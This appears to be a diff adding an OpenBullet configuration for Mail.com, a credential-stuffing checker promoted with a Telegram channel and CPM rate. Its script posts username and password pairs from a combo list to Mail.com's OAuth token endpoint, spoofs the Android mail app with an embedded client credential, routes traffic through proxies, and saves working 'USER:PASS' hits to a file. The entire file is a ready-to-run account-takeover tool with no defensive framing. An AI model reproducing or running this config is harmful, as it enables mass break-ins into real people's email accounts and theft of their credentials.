@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Mail.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-07-02T02:05:35.5030602+03:30",
+  "AdditionalInfo": "Telegram Channel: t.me/OpenBulletChannel | CPM Rate: 500-3000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#U FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#P FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Post REQUEST POST "https://oauth2.mail.com/token" 
+  CONTENT "grant_type=password&username=<US>&password=<PS>&device_name=OnePlus+ONEPLUS+A5000" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Authorization: Basic bWFpbGNvbV9tYWlsYXBwX2FuZHJvaWQ6a2luMmxTU2tVUXRRQ0NsWG9YZklOaEp1bUc2SmQwM0taNVdMN05KOQ==" 
+  HEADER "User-Agent: mailcom.android.androidmail/7.14 Dalvik/2.1.0 (Linux; U; Android 7.1.1; ONEPLUS A5000 Build/NMF26X)" 
+  HEADER "X-UI-APP: mailcom.android.androidmail/7.14" 
+  HEADER "Content-Type: application/x-www-form-urlencoded;charset=\"UTF-8\"" 
+  HEADER "Host: oauth2.mail.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 99" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Perm.ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Perm.UNDISCLOSED" 
+
+#Save UTILITY File "Mail.com .txt" AppendLines "<USER>:<PASS>" -> VAR "Save" 
+
